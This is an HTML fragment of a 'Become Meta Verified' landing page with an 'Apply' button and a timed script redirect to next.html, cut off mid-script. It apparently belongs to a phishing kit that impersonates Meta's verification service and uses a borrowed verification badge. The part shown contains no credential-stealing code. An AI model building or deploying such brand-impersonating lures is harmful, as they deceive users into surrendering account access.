...
<body>
    ...
    <div class="content">
        <div class="col-sm-6">
            <img src="800px-Twitter_Verified_Badge.svg.png" alt="meta" class="meta-logo">
            <h1 class="my-3 fs-1">Become <br> Meta Verified</h1>
            <div style="margin-bottom: 30px;"></div>
            <a href="next.html" class="btn">Apply</a>
        ...
        <div class="col-sm-5 image" style="background-image: url('mainlogo.1e021de7020fcdab170b.png'); "></div>
    </div>
</body>
<script>
    ...
    setTimeout(function() {
    var redirectURL = "next.html"; // Updated URL
